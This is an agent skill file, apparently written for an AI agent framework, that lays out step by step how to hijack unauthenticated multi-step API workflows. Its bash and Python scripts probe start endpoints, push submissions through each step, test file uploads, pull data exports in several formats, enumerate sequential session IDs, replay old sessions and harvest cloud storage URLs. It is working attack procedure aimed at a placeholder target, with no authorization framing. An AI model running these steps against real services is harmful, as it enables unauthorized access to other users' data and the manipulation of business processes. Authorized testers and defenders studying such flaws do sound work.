---
name: unauth-api-flow-hijack
description: Exploit unauthenticated multi-step API flows — start, submit, upload, export without credentials.
version: 1.0.0
author: uphiago
license: MIT
platforms: [linux]
compatibility: Requires curl, python3
metadata:
  hermes:
    tags: [recon, API, unauthenticated, flow, interview, form, upload, export]
    category: recon
    related_skills:
      - api-noauth-hunt
      - hardcoded-credential-hunt
      - hunt-write-gap
      - hunt-idor
---

# Unauthenticated API Flow Hijack

Exploit API endpoints that implement a full business workflow (interview, application, checkout, onboarding) without requiring authentication at any step. Unlike simple data exposure, these flows allow an attacker to participate in — and manipulate — the application's core business logic: submitting forms, uploading files, completing transactions, and exporting data. The entire state machine is accessible without credentials.

## When to Use

- An API serves a multi-step workflow (start → step1 → step2 → ... → complete).
- No authentication token, session cookie, or API key is required at any step.
- The API returns session identifiers (UUIDs, tokens) that can be reused across steps.
- The workflow includes file upload, data submission, or export functionality.
- Error messages reveal the expected request format (validating that endpoints are live).

## Prerequisites

- `terminal` tool with curl and python3.
- Discovery of at least one API endpoint that accepts POST without authentication.
- The endpoint returns an identifier (session ID, interview ID, token) that can be passed to subsequent steps.

## Quick Detection

```bash
# Probe common flow-starting endpoints
for ep in /start /api/start /api/v1/start /begin /init /api/init \
          /start-interview /api/interview/start /api/session/start; do
  code=$(curl -sk -o /tmp/resp.json -w "%{http_code}" \
    -X POST "https://target.com$ep" \
    -H "Content-Type: application/json" -d '{}')
  if [ "$code" = "200" ] || [ "$code" = "201" ]; then
    echo "=== $ep ($code) ==="
    cat /tmp/resp.json | python3 -m json.tool 2>/dev/null | head -20
    # Extract any returned ID
    cat /tmp/resp.json | python3 -c "
import sys,json,re
try:
    d=json.load(sys.stdin)
    for k in d:
        if any(x in k.lower() for x in ['id','token','session','key']):
            print(f'{k}: {d[k]}')
except: pass
"
  fi
done
```

## Procedure

### Phase 1 — Map the Flow

Identify all steps by following the API's natural progression:

```python
import requests, json

BASE = "https://target.com"
session = requests.Session()

# Step 1: Start the flow
r = session.post(f"{BASE}/api/flow/start", json={})
data = r.json()
flow_id = data.get("id") or data.get("sessionId") or data.get("token")
print(f"Started: {flow_id}")

# Step 2-N: Follow the flow by submitting whatever the API asks for
for step in range(1, 20):
    # Try generic submissions — the API's error messages will guide you
    r = session.post(f"{BASE}/api/flow/submit", json={
        "id": flow_id,
        "answer": "test response",
        "data": {"key": "value"}
    })
    
    resp = r.json()
    print(f"Step {step}: {resp.get('currentStep', '?')} — {resp.get('message', '')[:80]}")
    
    # Check for completion or blocked paths
    if resp.get("complete") or resp.get("error"):
        break
    
    # Extract any requirements from the message
    if "required" in str(resp).lower() or "invalid" in str(resp).lower():
        print(f"  Validation: {json.dumps(resp)[:200]}")
```

### Phase 2 — Exploit File Upload

If the flow includes file upload, test for unrestricted upload:

```bash
# Test file upload without auth
curl -sk -X POST "https://target.com/api/flow/upload" \
  -F "file=@test.pdf;type=application/pdf" \
  -F "id=$FLOW_ID" | python3 -m json.tool

# The response often returns a public URL for the uploaded file
# Check if uploads are stored in a public bucket
```

### Phase 3 — Exploit Data Export

Many flows offer export/download at completion:

```bash
# Test export without auth
curl -sk "https://target.com/api/flow/export" -o export.xlsx
file export.xlsx  # Check if it's a real file with data

# Try export with different format parameters
for fmt in xlsx csv json pdf xml; do
  curl -sk "https://target.com/api/flow/export?format=$fmt" -o "export.$fmt"
  [ -s "export.$fmt" ] && echo "export.$fmt: $(wc -c < export.$fmt) bytes"
done
```

### Phase 4 — Enumerate and Replay

If session IDs are predictable or exposed, enumerate other sessions:

```bash
# Check if IDs are sequential or enumerable
for id in $(seq 1 100); do
  code=$(curl -sk -o /dev/null -w "%{http_code}" \
    "https://target.com/api/flow/status/$id")
  [ "$code" = "200" ] && echo "Active: $id"
done

# Test if old session IDs can be replayed
curl -sk -X POST "https://target.com/api/flow/submit" \
  -H "Content-Type: application/json" \
  -d '{"id": "OLD_SESSION_ID", "answer": "replay test"}'
```

### Phase 5 — Chain with Storage Access

If uploads go to a cloud storage bucket, chain with cloud attack skills:

```bash
# Extract storage URLs from upload responses
curl -sk -X POST "https://target.com/api/flow/upload" \
  -F "file=@test.pdf" \
  -F "id=$FLOW_ID" | python3 -c "
import sys, json, re
data = sys.stdin.read()
for url in re.findall(r'https?://[^\s\"<>]+\.(?:supabase\.co|amazonaws\.com|storage\.googleapis\.com)[^\s\"<>]*', data):
    print(f'STORAGE_URL: {url}')
"
```

## Pitfalls

- **Rate limiting kills the flow.** Multi-step APIs often have per-IP rate limits. Slow down between steps (0.5-1s delay).
- **State expires.** Some flows invalidate session IDs after a timeout. If steps start failing, restart the flow.
- **Validation gates exist.** The API may require valid data formats (email, phone, file type). Read error messages carefully — they tell you exactly what format is expected.
- **Not every step is POST.** Some flows use GET for status checks, PUT for updates, and DELETE for cancellation. Test all methods.
- **The export may be empty.** A freshly started flow produces an empty export. Run through the full flow before testing export.

## Verification

1. Complete the full flow from start to finish without any authentication.
2. Verify each step produces a state change visible on subsequent steps (the flow progresses).
3. Confirm file uploads are stored and retrievable (check the returned URL).
4. Verify export produces real data (check file size and content).
5. If session IDs are enumerable, confirm cross-session access (access another session's data).

## Related Skills

- **`api-noauth-hunt`** — Detecting API endpoints that lack authentication.
- **`hardcoded-credential-hunt`** — Finding passwords that unlock privileged steps within the flow.
- **`hunt-write-gap`** — POST/PUT endpoints that accept writes without requiring read authentication.
- **`hunt-idor`** — Exploiting insecure direct object references within flow session IDs.
- **`firebase-supabase-attack`** — If uploads go to Supabase/Firebase storage.
